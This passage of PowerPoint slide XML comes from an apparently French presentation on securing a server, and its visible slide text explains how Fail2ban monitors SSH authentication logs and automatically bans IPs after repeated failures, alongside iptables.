          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p10"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>09</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4EB13223-48DF-CE99-33F7-D304B82EBF57}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="45720"/>
            <a:ext cx="6679440" cy="685800"/>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6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="186"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18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5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="185"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18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88"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="188"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="18" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="189"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="189"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="21" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="191"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="191"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="24" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="190"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="190"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="27" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="192"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="20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 grpId="0"/>
      <p:bldP spid="186" grpId="0"/>
      <p:bldP spid="189" grpId="0"/>
      <p:bldP spid="190" grpId="0" animBg="1"/>
      <p:bldP spid="19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8"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="Google Shape;200;p11"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Fail2ban : protection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>automatisée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t> et durable</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="Google Shape;201;p11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1645920"/>
            <a:ext cx="5394960" cy="4114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37931"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1450"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Surveillance </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> temps </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>réel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de /var/log/auth.log</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="137931"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1450"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Bannissement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> IP après un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>nombre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>défini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'échecs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> SSH</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="137931"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1450"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Jail « </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>sshd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> » </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>actif</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vérifié</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : Currently failed 0 / banned 0 (service tout </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>juste</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>activé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="137931"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1450"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Complète</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> iptables par </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> protection durable et sans intervention </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>manuelle</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202" name="Google Shape;202;p11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="1989104"/>
            <a:ext cx="5468112" cy="3611312"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1772"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E86C0"/>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3" name="Google Shape;203;p11" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig09_fail2ban.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6309360" y="2071400"/>
            <a:ext cx="5303520" cy="3446720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Google Shape;204;p11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227064" y="5636992"/>
            <a:ext cx="5468112"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Installation et vérification du service Fail2ban</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p11"/>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dirty="0">
                <a:solidFill>
